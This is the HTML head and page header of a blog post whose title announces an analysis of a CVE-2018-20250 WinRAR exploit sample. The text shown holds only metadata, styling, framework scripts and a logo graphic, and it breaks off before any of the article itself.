<!DOCTYPE html><html lang="zh"> <head><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/nicky.cool/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CDGfc0hd.js"></script><!-- Global Metadata --><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="generator" content="Astro v5.17.2"><!-- Primary Metadata --><title>CVE-2018-20250 WinRAR 漏洞利用样本分析 - Tech &amp; Daily</title><meta name="title" content="CVE-2018-20250 WinRAR 漏洞利用样本分析 - Tech &#38; Daily"><meta name="description" content="Analysis of CVE-2018-20250 WinRAR Exploit Sample"><meta name="author" content="NickyWU"><!-- Color --><meta name="theme-color" content=""><meta name="color-scheme" content="light dark"><!-- Open Graph & Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://nickyl07.github.io/nicky.cool/blog/%E9%9A%90%E7%A7%98%E7%9A%84%E7%88%86%E7%A0%B4%E6%89%8Bcve-2018-20250-winrar-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"><meta property="og:title" content="CVE-2018-20250 WinRAR 漏洞利用样本分析 - Tech &#38; Daily"><meta property="og:description" content="Analysis of CVE-2018-20250 WinRAR Exploit Sample"><meta property="og:image" content="https://nickyl07.github.io/nicky.cool/og-images/og-image.png"><meta property="og:site_name" content="astro-antfustyle-theme.vercel.app"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="NickyWU"><meta property="article:published_time" content="2024-10-11T00:00:00.000Z"><meta property="article:modified_time" content><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://nickyl07.github.io/nicky.cool/blog/%E9%9A%90%E7%A7%98%E7%9A%84%E7%88%86%E7%A0%B4%E6%89%8Bcve-2018-20250-winrar-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"><meta property="twitter:title" content="CVE-2018-20250 WinRAR 漏洞利用样本分析 - Tech &#38; Daily"><meta property="twitter:description" content="Analysis of CVE-2018-20250 WinRAR Exploit Sample"><meta property="twitter:image" content="https://nickyl07.github.io/nicky.cool/og-images/og-image.png"><!-- Canonical URL --><link rel="canonical" href="https://nickyl07.github.io/nicky.cool/blog/%E9%9A%90%E7%A7%98%E7%9A%84%E7%88%86%E7%A0%B4%E6%89%8Bcve-2018-20250-winrar-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"><!-- Icon --><link rel="icon" type="image/svg+xml" href="/nicky.cool/favicon.svg"><link rel="icon" sizes="32x32" href="/nicky.cool/favicon.ico"><link rel="apple-touch-icon" href="/nicky.cool/apple-touch-icon.png"><!-- Manifest --><link rel="manifest" href="/nicky.cool/app.webmanifest"><!-- Sitemap --><link rel="sitemap" href="/nicky.cool/sitemap-index.xml"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="/nicky.cool/rss.xml" href="/rss.xml"><!-- Google JSON-LD Structured Data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2018-20250 WinRAR 漏洞利用样本分析 - Tech & Daily","image":"https://nickyl07.github.io/nicky.cool/og-images/og-image.png","url":"https://nickyl07.github.io/nicky.cool/blog/%E9%9A%90%E7%A7%98%E7%9A%84%E7%88%86%E7%A0%B4%E6%89%8Bcve-2018-20250-winrar-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","datePublished":"2024-10-11T00:00:00.000Z","description":"Analysis of CVE-2018-20250 WinRAR Exploit Sample","author":{"@type":"Person","name":"NickyWU","url":"https://astro-antfustyle-theme.vercel.app/"}}</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/nicky.cool/_astro/_uno.BvtSHey1.css">
<style>*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:var(--un-default-border-color, #e5e7eb)}:before,:after{--un-content: ""}html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}
</style>
<link rel="stylesheet" href="/nicky.cool/_astro/main.C20M51KN.css">
<link rel="stylesheet" href="/nicky.cool/_astro/prose.DEF_gphF.css">
<link rel="stylesheet" href="/nicky.cool/_astro/markdown.DtEzIPn6.css">
<style>.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:1em}@media (max-width: 639.9px){.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:.875rem;line-height:1.25rem}}.github-item-prose>:first-child{margin-top:1.6em}.github-item-prose>:last-child{margin-bottom:1.25em}.github-item-prose h5 a{font-size:.875em}@media (max-width: 639.9px){.github-item-prose li{font-size:.875rem;line-height:1.25rem}}summary::-webkit-details-marker{display:none}.card-item-prose p{margin-bottom:1.1em;margin-top:1.1em}.card-masonry>*:first-child{border-radius:.5rem}.card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.dark .card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.card-grid>*:first-child{border-radius:.75rem}.card-grid>*:first-child:hover{--un-scale-x:1.03;--un-scale-y:1.03;transform:translate(var(--un-translate-x)) translateY(var(--un-translate-y)) translateZ(var(--un-translate-z)) rotate(var(--un-rotate)) rotateX(var(--un-rotate-x)) rotateY(var(--un-rotate-y)) rotate(var(--un-rotate-z)) skew(var(--un-skew-x)) skewY(var(--un-skew-y)) scaleX(var(--un-scale-x)) scaleY(var(--un-scale-y)) scaleZ(var(--un-scale-z));--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow);transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.dark .card-grid>*:first-child:hover{--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.photo-view[data-layout=masonry] .icon-masonry,.photo-view[data-layout=square] .icon-grid{display:block}.photo-view[data-layout=square] .photo-container{display:grid;grid-template-columns:repeat(auto-fill,minmax(var(--min-photo-width),1fr));gap:var(--photo-gap)}.photo-figure{cursor:pointer;overflow:hidden;background-size:cover;background-image:var(--photo-placeholder)}.photo-view[data-layout=masonry] .photo-figure{position:absolute;top:0;left:0;width:var(--photo-width);height:var(--photo-height);border-radius:.375rem;transform:translate(var(--photo-left),var(--photo-top))}.photo-view[data-layout=square] .photo-figure{position:relative;aspect-ratio:1}.photo-figure img{width:100%;height:100%;object-fit:cover;opacity:var(--photo-opacity, 0);transition:all .3s ease-in-out}.photo-figure:hover img,.photo-figure:focus img{transform:scale(1.05)}.photo-figure figcaption{position:absolute;bottom:0;left:0;width:100%;padding:1rem .6rem .6rem;color:#fff;font-size:.875rem;opacity:0;background:linear-gradient(to top,rgba(0,0,0,.5),transparent);transition:all .3s ease-in-out}.photo-figure:hover figcaption,.photo-figure:focus figcaption{opacity:1}
.astro-route-announcer{position:absolute;left:0;top:0;clip:rect(0 0 0 0);clip-path:inset(50%);overflow:hidden;white-space:nowrap;width:1px;height:1px}
.logo-container[data-astro-cid-cagdmauf]{display:flex;justify-content:center;align-items:center;gap:.8rem;transform:scale(1.05)}@media (max-width: 300px){.logo-container[data-astro-cid-cagdmauf]{margin-top:.125rem;transform-origin:0%;transform:scale(.95)}}.logo-container[data-astro-cid-cagdmauf] svg[data-astro-cid-cagdmauf]{height:2rem}
:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
.i-ph-music-notes-fill[data-v-ef9455f9]{display:block;transform-origin:center}.animate-fade-in[data-v-ef9455f9]{animation:fadeIn-ef9455f9 .3s ease-out forwards}@keyframes fadeIn-ef9455f9{0%{opacity:0;transform:translate(-10px)}to{opacity:1;transform:translate(0)}}input[type=range][data-v-ef9455f9]{-webkit-appearance:none;background:#0000001a;border-radius:2px}input[type=range][data-v-ef9455f9]::-webkit-slider-thumb{-webkit-appearance:none;height:8px;width:8px;border-radius:50%;background:currentColor}
</style></head> <body class="relative flex flex-col min-h-screen
      font-sans text-gray-700 dark:text-gray-200" style="--enter-step:60ms" data-astro-transition-persist="music-player"> <!-- Background -->  <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).only=e;window.dispatchEvent(new Event("astro:only"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="Z17VUjJ" component-url="/nicky.cool/_astro/MusicPlayer.7FHsg482.js" component-export="default" renderer-url="/nicky.cool/_astro/client.BkZ8gEVU.js" props="{&quot;songs&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;LEFT RIGHT&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/LEFT RIGHT.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;PUPPET SHOW&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/PUPPET SHOW.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;SHOOTING STAR&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/SHOOTING STAR.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;WINTER WITHOUT YOU&quot;],&quot;url&quot;:[0,&quot;/nicky.cool/media/WINTER WITHOUT YOU.mp3&quot;]}]]],&quot;data-astro-transition-persist&quot;:[0,&quot;global-music-player&quot;]}" ssr client="only" opts="{&quot;name&quot;:&quot;MusicPlayer&quot;,&quot;value&quot;:&quot;vue&quot;}" data-astro-transition-persist="global-music-player"></astro-island> <!-- Skip Link --> <a class="op-60 no-underline hover:op-100 sr-only focus:not-sr-only focus:fixed focus:start-1 focus:top-1.5 focus:op-20" href="#main">  
Skip to content
</a> <!-- Nav Bar --> <header class="flex items-center gap-6 p-[1.75rem_2rem_2rem] lt-md:px-7"> <a class="op-60 no-underline hover:op-100 select-none op-transition" href="/nicky.cool/" aria-label="NickyWU" aria-current="false" data-astro-cid-cagdmauf="true">   <div class="logo-container" data-astro-cid-cagdmauf> <!-- ICON SVG --> <!-- <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 32 32"
      width="2em"
      height="2em"
      aria-hidden="true"
    >
      <path
        fill="url(#vscodeIconsFileTypeLightAstro0)"
        d="M11.025 20.499c-.532 1.75-.154 4.184 1.105 5.331v-.042l.042-.112c.154-.741.756-1.203 1.526-1.175c.713.014 1.12.392 1.217 1.217c.042.308.042.616.056.938v.098c0 .7.196 1.371.588 1.959c.35.56.84.993 1.497 1.287l-.028-.056l-.028-.112c-.49-1.469-.14-2.49 1.147-3.358l.392-.266l.868-.573a4.25 4.25 0 0 0 1.791-3.037c.07-.532 0-1.05-.154-1.553l-.21.14c-1.945 1.035-4.17 1.4-6.325.98c-1.301-.197-2.56-.56-3.498-1.652z"
      >
      </path>
      <path
        class="dark:fill-[#fdfdfd]"
        fill="#17191e"
        d="M4.925 20.191s3.736-1.82 7.486-1.82l2.84-8.759c.098-.42.406-.7.756-.7s.644.28.756.714l2.826 8.746c4.45 0 7.487 1.82 7.487 1.82L20.709 2.84c-.168-.518-.49-.84-.896-.84h-7.612c-.406 0-.7.322-.896.84z"
      >
      </path>
      <defs>
        <linearGradient
          id="vscodeIconsFileTypeLightAstro0"
          x1="8.19"
          x2="16.91"
          y1="23"
          y2="18.89"
          gradientTransform="translate(-.673 -2.198)scale(1.3993)"
          gradientUnits="userSpaceOnUse"
        >
          <stop offset="0" stop-color="#d83333"></stop>
          <stop offset="1" stop-color="#f041ff"></stop>
        </linearGradient>
      </defs>
    </svg> --> <!-- TEXT SVG --> <!-- Generator: https://danmarshall.github.io/google-font-to-svg-path/ --> <!-- Google font: Great Vibes --> <svg width="107.548" height="40" viewBox="0 0 107.548 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-astro-cid-cagdmauf> <g id="svgGroup" class="dark:fill-[#fdfdfd]" fill="#17191e" fill-rule="evenodd" stroke-linecap="round" font-size="9pt" data-astro-cid-cagdmauf> <path vector-effect="non-scaling-stroke" d="M 1.72 26 Q 0.84 26 0.42 25.6 Q 0 25.2 0 24.28 Q 0 23.04 0.74 21.1 Q 1.48 19.16 2.68 16.88 Q 3.88 14.6 5.24 12.36 Q 6.6 10.12 7.84 8.26 Q 9.08 6.4 9.88 5.32 L 9.52 5.2 Q 9.28 5.12 9.28 4.92 Q 9.28 4.72 9.86 4.1 Q 10.44 3.48 11.24 2.74 Q 12.04 2 12.74 1.46 Q 13.44 0.92 13.68 0.92 Q 14.32 0.92 14.86 1.44 Q 15.4 1.96 15.4 2.64 Q 15.4 2.8 15.32 2.96 Q 15.2 3.56 14.82 5.12 Q 14.44 6.68 14.02 8.78 Q 13.6 10.88 13.3 13.16 Q 13 15.44 13 17.44 Q 13 19.76 13.58 21.36 Q 14.16 22.96 15.68 22.96 Q 17.04 22.96 18.42 21.68 Q 19.8 20.4 21.1 18.34 Q 22.4 16.28 23.44 13.96 Q 23.8 13.16 24.32 11.78 Q 24.84 10.4 25.34 8.78 Q 25.84 7.16 26.18 5.62 Q 26.52 4.08 26.52 3 Q 26.52 1.44 25.68 1.44 Q 25.36 1.44 25.02 1.58 Q 24.68 1.72 24.28 1.72 Q 24.16 1.72 23.98 1.66 Q 23.8 1.6 23.8 1.44 Q 23.8 1.04 24.28 0.72 Q 24.76 0.4 25.38 0.2 Q 26 0 26.32 0 Q 27.52 0 28.06 0.82 Q 28.6 1.64 28.6 3.04 Q 28.6 4.68 27.96 6.92 Q 27.32 9.16 26.2 11.6 Q 25.08 14.04 23.64 16.38 Q 22.2 18.72 20.62 20.62 Q 19.04 22.52 17.46 23.64 Q 15.88 24.76 14.48 24.76 Q 13.12 24.76 12.34 23.94 Q 11.56 23.12 11.24 21.74 Q 10.92 20.36 10.92 18.64 Q 10.92 16.68 11.24 14.54 Q 11.56 12.4 12 10.42 Q 12.44 8.44 12.88 6.94 Q 13.32 5.44 13.56 4.76 Q 12.56 5.88 11 7.78 Q 9.44 9.68 7.74 11.96 Q 6.04 14.24 4.52 16.6 Q 3 18.96 2.06 21.06 Q 1.12 23.16 1.12 24.68 Q 1.12 24.88 1.18 25.12 Q 1.24 25.36 1.52 25.36 Q 2.24 25.36 2.24 25.68 Q 2.24 26 1.72 26 Z M 65.76 19.64 L 65.76 19.32 Q 65.28 20.04 64.36 21 Q 63.44 21.96 62.28 22.86 Q 61.12 23.76 60 24.36 Q 58.88 24.96 57.96 24.96 Q 57.32 24.96 57.1 24.56 Q 56.88 24.16 56.88 23.64 Q 56.88 22.24 57.48 20.76 Q 58.08 19.28 58.84 18.02 Q 59.6 16.76 60.2 15.9 Q 60.8 15.04 60.8 14.92 Q 60.8 14.88 60.72 14.88 L 60.38 14.88 Q 60.2 14.88 60.32 14.64 Q 60.88 13.96 61.72 13.44 Q 62.56 12.92 63.32 12.92 Q 63.6 12.92 63.98 13.14 Q 64.36 13.36 64.36 13.68 Q 64.36 13.88 64.12 14.12 Q 63.84 14.4 63.46 14.76 Q 63.08 15.12 62.44 15.88 Q 62.08 16.28 61.44 17.18 Q 60.8 18.08 60.12 19.22 Q 59.44 20.36 58.98 21.46 Q 58.52 22.56 58.52 23.36 Q 58.52 23.48 58.54 23.62 Q 58.56 23.76 58.72 23.88 Q 59.28 23.92 60.12 23.38 Q 60.96 22.84 61.9 21.98 Q 62.84 21.12 63.7 20.14 Q 64.56 19.16 65.22 18.3 Q 65.88 17.44 66.16 16.92 Q 66.6 16.12 67.48 16.12 Q 68.12 16.12 68.22 16.4 Q 68.32 16.68 68.32 17.16 Q 68.32 18.72 68.14 19.9 Q 67.96 21.08 67.48 22.56 Q 70.04 20.36 72.36 17.92 Q 72.4 17.84 72.54 17.72 Q 72.68 17.6 72.76 17.6 Q 73 17.6 73 17.84 Q 73 18.16 72.76 18.48 Q 72.4 18.92 71.98 19.36 Q 71.56 19.8 71.16 20.24 Q 70.2 21.28 69.2 22.3 Q 68.2 23.32 67.08 24.24 Q 65.24 29.08 62.26 32.74 Q 59.28 36.4 54.76 39 Q 54 39.44 53.04 39.84 Q 52.08 40.24 51.16 40.24 Q 49.32 40.24 49.32 38.4 Q 49.32 38.2 49.34 38 Q 49.36 37.8 49.4 37.6 Q 49.72 36.16 50.76 34.84 Q 51.8 33.52 53.2 32.38 Q 54.6 31.24 56.06 30.26 Q 57.52 29.28 58.68 28.56 Q 59.36 28.12 60.42 27.48 Q 61.48 26.84 62.68 26.1 Q 63.88 25.36 64.96 24.72 Q 65.4 23.6 65.58 22.22 Q 65.76 20.84 65.76 19.64 Z M 52.08 39.24 Q 53.16 39.24 54.42 38.46 Q 55.68 37.68 56.92 36.52 Q 58.16 35.36 59.18 34.22 Q 60.2 33.08 60.8 32.32 Q 61.48 31.4 62.12 30.5 Q 62.76 29.6 63.32 28.64 Q 64.16 27.24 64.72 25.92 Q 64.76 25.8 64.66 25.78 L 64.56 25.76 Q 63.32 26.64 62.06 27.5 Q 60.8 28.36 59.52 29.2 Q 58.88 29.6 57.8 30.38 Q 56.72 31.16 55.48 32.14 Q 54.24 33.12 53.12 34.18 Q 52 35.24 51.28 36.26 Q 50.56 37.28 50.56 38.08 Q 50.56 38.72 51.06 38.98 Q 51.56 39.24 52.08 39.24 Z M 42.4 22.56 L 45.28 17.44 Q 44.92 17.72 44.6 18.04 Q 44.28 18.36 43.88 18.72 Q 43.72 18.88 43.52 18.88 Q 43.36 18.88 43.36 18.72 Q 43.36 18.56 43.56 18.28 Q 44.48 17.12 45.82 15.7 Q 47.16 14.28 48.76 11.84 Q 49.28 11.04 50.24 9.84 Q 51.2 8.64 52.34 7.28 Q 53.48 5.92 54.64 4.7 Q 55.8 3.48 56.68 2.64 Q 57.12 2.28 57.44 2.04 Q 57.76 1.8 57.92 1.76 Q 58.28 1.76 58.6 2.16 Q 58.92 2.56 58.96 3 Q 58.96 3.44 58.64 3.6 Q 58.16 4 57.74 4.32 Q 57.32 4.64 56.88 5.04 Q 55.8 6 54.48 7.4 Q 53.16 8.8 51.82 10.4 Q 50.48 12 49.26 13.62 Q 48.04 15.24 47.12 16.68 Q 47.2 16.76 47.28 16.76 Q 47.4 16.76 47.58 16.62 Q 47.76 16.48 48.04 16.24 Q 49.44 15.04 51.08 13.78 Q 52.72 12.52 54.24 11.48 Q 54.68 11.2 55.14 10.98 Q 55.6 10.76 56.12 10.76 Q 56.44 10.76 56.74 10.86 Q 57.04 10.96 57.2 11.2 Q 57.6 11.32 57.98 11.6 Q 58.36 11.88 58.36 12.36 Q 58.36 12.96 57.76 13.5 Q 57.16 14.04 56.72 14.36 Q 55.36 15.24 53.54 15.86 Q 51.72 16.48 50 16.8 Q 49.72 18.04 49.5 19.34 Q 49.28 20.64 49.28 21.72 Q 49.28 22.84 49.56 23.56 Q 49.84 24.28 50.6 24.28 Q 51.04 24.28 51.7 23.86 Q 52.36 23.44 53.06 22.86 Q 53.76 22.28 54.34 21.72 Q 54.92 21.16 55.24 20.88 Q 55.6 20.56 56.28 19.92 Q 56.96 19.28 57.62 18.64 Q 58.28 18 58.52 17.72 Q 58.56 17.68 58.64 17.68 Q 58.84 17.68 58.84 17.96 Q 58.84 18.28 58.36 18.8 L 57.68 19.56 Q 56.04 21.4 54.46 23.06 Q 52.88 24.72 51.68 25.36 Q 51.28 25.56 50.88 25.56 Q 49.04 25.56 48.32 24.36 Q 47.6 23.16 47.6 21.44 Q 47.6 20.48 47.76 19.46 Q 47.92 18.44 48.16 17.44 Q 47.68 17.72 47 18.32 Q 46.32 18.92 45.44 19.84 Q 44.76 21.2 44.24 22.46 Q 43.72 23.72 43.08 24.76 Q 42.96 24.92 42.76 24.96 Q 42.56 25 42.36 25 Q 41.52 25 41.52 24.24 Q 41.52 23.36 42.4 22.56 Z M 50.28 15.76 Q 50.72 15.68 51.64 15.4 Q 52.56 15.12 53.54 14.68 Q 54.52 14.24 55.26 13.74 Q 56 13.24 56.12 12.72 Q 56 12.44 55.68 12.44 Q 55.4 12.44 54.64 12.86 Q 53.88 13.28 53 13.86 Q 52.12 14.44 51.36 14.98 Q 50.6 15.52 50.28 15.76 Z M 34.72 25.48 Q 33.4 25.48 32.62 24.6 Q 31.84 23.72 31.84 22.36 Q 31.84 21.08 32.66 19.56 Q 33.48 18.04 34.78 16.6 Q 36.08 15.16 37.48 14.08 Q 38.88 13 40 12.6 Q 40.52 12.4 40.96 12.4 Q 41.48 12.4 41.64 12.64 Q 41.8 12.88 41.9 13.16 Q 42 13.44 42.24 13.6 Q 42.68 13.84 42.68 14.44 Q 42.68 14.88 42.46 15.5 Q 42.24 16.12 41.84 16.58 Q 41.44 17.04 40.88 17.04 Q 40.36 17.04 40.36 16.6 Q 40.36 16.32 40.64 16 Q 40.92 15.68 41.2 15.3 Q 41.48 14.92 41.48 14.56 Q 41.48 14.2 41.12 14.2 Q 40.44 14.2 39.44 14.9 Q 38.44 15.6 37.4 16.72 Q 36.36 17.84 35.44 19.1 Q 34.52 20.36 33.96 21.48 Q 33.4 22.6 33.4 23.32 Q 33.4 23.84 33.66 24.18 Q 33.92 24.52 34.44 24.52 Q 35.28 24.52 36.32 24.04 Q 37.36 23.56 38.3 22.88 Q 39.24 22.2 39.84 21.68 Q 40.96 20.68 42.02 19.66 Q 43.08 18.64 44.12 17.6 Q 44.24 17.48 44.4 17.48 Q 44.76 17.48 44.76 17.8 Q 44.76 17.96 44.12 18.66 Q 43.48 19.36 42.6 20.24 Q 41.72 21.12 40.96 21.84 Q 40.2 22.56 39.96 22.76 Q 39.32 23.32 38.42 23.96 Q 37.52 24.6 36.56 25.04 Q 35.6 25.48 34.72 25.48 Z M 26.8 25.76 Q 26.16 25.76 25.62 25.24 Q 25.08 24.72 24.96 24.12 Q 25.08 23.36 25.5 22.26 Q 25.92 21.16 26.48 19.96 Q 27.04 18.76 27.6 17.7 Q 28.16 16.64 28.56 16 Q 27.8 16.68 26.94 17.52 Q 26.08 18.36 25.32 19.08 Q 25.28 19.12 25.14 19.24 Q 25 19.36 24.88 19.36 Q 24.6 19.36 24.6 19.12 Q 24.6 18.92 24.76 18.76 Q 25.84 17.56 27.02 16.36 Q 28.2 15.16 29.32 13.88 Q 29.68 13.44 29.94 13.18 Q 30.2 12.92 30.76 12.92 Q 31 12.92 31.5 13.02 Q 32 13.12 32.34 13.36 Q 32.68 13.6 32.44 13.96 Q 32.16 14.4 31.48 15.4 Q 30.8 16.4 29.94 17.68 Q 29.08 18.96 28.26 20.26 Q 27.44 21.56 26.92 22.6 Q 26.4 23.64 26.4 24.16 Q 26.4 24.4 26.56 24.4 Q 26.8 24.4 27.38 23.96 Q 27.96 23.52 28.54 23.02 Q 29.12 22.52 29.32 22.36 Q 30.48 21.36 31.6 20.3 Q 32.72 19.24 33.72 18.08 Q 33.8 18 33.94 17.84 Q 34.08 17.68 34.24 17.68 Q 34.44 17.68 34.44 17.92 Q 34.44 18.2 34.24 18.48 Q 33.72 19.12 33.08 19.74 Q 32.44 20.36 31.88 20.96 Q 30.84 22 29.86 23.02 Q 28.88 24.04 27.92 25.12 Q 27.72 25.36 27.42 25.56 Q 